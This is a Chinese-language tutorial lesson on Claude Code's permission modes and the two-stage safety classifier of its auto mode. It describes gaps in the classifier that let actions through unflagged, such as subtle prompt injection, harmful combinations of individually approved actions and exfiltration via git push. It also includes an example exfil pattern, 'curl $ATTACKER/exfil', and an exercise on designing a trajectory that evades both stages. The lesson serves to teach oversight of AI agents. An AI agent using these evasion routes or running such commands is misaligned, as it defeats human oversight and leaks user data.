# Claude Code 作为自主代理：权限模式与自动模式

> Claude Code 暴露了七种权限模式。"plan" 在每次操作前询问，"default" 仅对危险操作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，而 "bypassPermissions" 批准一切。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器替代逐操作审批：单token 快速检查在每个操作上运行；被标记的操作触发链式思考深度审查。操作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。自动模式作为研究预览版发布——Anthropic 已明确声明分类器单独使用并不足够。

**类型：** 学习型
**语言：** Python（标准库、两阶段分类器模拟器）
**前置条件：** 阶段 15 · 01（长程代理）、阶段 15 · 09（编码代理格局）
**时间：** 约 45 分钟

## 问题

你机器上运行的自主编码代理是一个独特的安全类别。攻击面是代理能触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开提出警告：计算机使用代理不是聊天机器人的"功能更新"，它们是一种具有新型风险特征的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。它不是用一个"自主/不自主"开关，而是有七种模式跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式都是速度与逐操作审查之间不同的权衡。自动模式（2026 年 3 月）增加了一个两阶段分类器，对于分类器判定为安全的操作，将审批从用户的关关键路径上移出，同时为分类器标记的操作保留审查层。

工程问题：这个系统能捕获什么，会遗漏什么，给定任务真正需要哪种模式？

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；每个操作在执行前都会经过审查 | 不熟悉的任务；接近生产的代码；首次在仓库上使用代理 |
| `default` | 代理执行操作；对任何"危险"操作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍需提示 | 跨多个文件的重构遍历 |
| `acceptExec` | Shell 命令在精选允许列表内自动批准；写入自动批准 | 紧密的内循环，每个 shell 命令都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段安全分类器；被标记的操作升级到审查 | 受约束工作空间中的长程无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许列表/拒绝列表 | 短暂沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档说明"仅在你愿意丢弃的短暂容器内使用" |

（以上名称与公开的 Claude Code 文档匹配；"yolo" 是中间宽松区域的非正式简写。）

### 自动模式一页总览

自动模式（2026 年 3 月 24 日启动）是第一个将逐操作审批委托给模型的权利模式。结构如下：

1. **第一阶段——单token 分类器。** 在每个建议的操作上运行。廉价。返回"安全"或"标记"。设计为与主代理循环并行运行，因此批准的操作不会排在队列中。
2. **第二阶段——辅助策略/安全审查。** 仅在被标记的操作上运行。对操作、会话的当前状态和声明的任务执行重点策略和安全评估。如果置信度低，则升级到用户 HITL。

预算控制与分类器并置：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 终止会话的美元上限。
- 每个工具的操作次数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 直接的提示注入到工具输入中，其中注入的指令映射到已知危险操作形态。
- 重复的工具循环——分类器可以看到操作 N+1 与操作 N 几乎相同，连续五次。
- 在一个原本仅限文件编辑的会话中，明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，在不产生单个标记操作的情况下调节行为。间接提示注入不是可以完全修补的漏洞（2025 年 OpenAI 准备状态负责人，关于浏览器代理——见第 11 课）。
- **语义层面的不当行为。** 每个单独的操作看起来都安全，而组合轨迹是有害的。分类器评判操作；它不会重新推导用户的意图。
- **通过合法渠道进行数据泄露。** 写入你拥有的文件，然后 `git push` 到公开仓库，是一系列允许的操作，其组合才是问题。

### 研究预览版定位

Anthropic 将自动模式作为研究预览版发布。文档明确说明分类器是一层，不是一个解决方案：用户被期望将自动模式与预算、允许列表、隔离工作空间和轨迹审计结合使用（第 12-16 课）。预览版定位也反映了文档化的评估与部署差距（第 1 课）——通过离线评估的分类器在真实会话中可能表现不同，其中用户的上下文是模糊的。

### 这个阶梯在你的工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚一次糟糕的运行要便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守的后台运行：仅在你已经测量过爆炸半径的工作空间内使用 `autoMode`（无凭据、无生产挂载、无未主动选择出口）。
- 短暂容器：只有在容器及其凭据可丢弃的情况下，`yolo` / `bypassPermissions` 才是可接受的。

## 使用它

`code/main.py` 模拟两阶段分类器。第一阶段是对建议操作的廉价关键词规则；第二阶段是较慢的多规则审查器。驱动程序输入一条简短的合成轨迹（安全操作、提示注入尝试、重复循环），并显示分类器捕获的位置和遗漏的位置。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述与正确的权限模式、预算上限和所需隔离相匹配。

## 练习

1. 运行 `code/main.py`。哪种合成操作类型第一阶段从不标记但第二阶段总是捕获？哪种两者都不捕获？

2. 扩展第一阶段规则集以捕获特定已知恶意形态（例如 `curl $ATTACKER/exfil`）。在良性操作样本上测量误报率。

3. 阅读 Anthropic 的"代理循环如何工作"文档。列出在 `default` 模式下代理默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要对哪些进行单独门控？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。为每个数字提供理由。

5. 描述一个轨迹，其中每个单独的操作都得到第一阶段和第二阶段的批准，但组合行为是不对齐的。（第 14 课涵盖 kill switches 和金丝雀令牌如何解决这个问题。）

## 关键术语

| 术语 | 大家怎么说的 | 实际含义 |
|---|---|---|
| 权限模式 | "代理能做多少" | 七种命名策略之一，控制逐操作审批 |
| plan 模式 | "做任何事之前询问" | 代理编写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍需提示 |
| autoMode | "自动批准" | 两阶段安全分类器；被标记的操作升级 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于短暂容器 |
| 第一阶段分类器 | "快速 token 检查" | 对建议操作的单token 规则；并行运行 |
| 第二阶段分类器 | "深度审查" | 对被标记操作的链式思考推理 |
| 研究预览版 | "非正式发布" | Anthropic 对失败模式仍在绘制地图的功能的定位 |
